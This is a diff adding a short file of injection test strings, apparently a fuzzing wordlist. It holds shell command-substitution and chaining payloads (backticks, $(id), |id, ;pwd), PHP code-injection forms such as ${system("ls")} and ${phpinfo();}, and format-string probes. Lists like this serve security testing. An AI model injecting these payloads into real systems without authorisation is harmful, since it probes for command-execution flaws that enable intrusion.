@@ -1,0 +1,28 @@
+`ls`
+$(ls)
+'$(ls)'
+"$(ls)
+'$(ls)
+${system("ls")}
+`system("pwd")`
+{${system("pwd")}}
+|id
+||pwd
+;&pwd
+%s
+%%s
+%25s
+|print id
+|id
+:print id
+:id
+;print id
+;id
+;|print id
+;|id
+!print id
+!id
+`id`
+$(id)
+${phpinfo();}
+{${phpinfo();}}
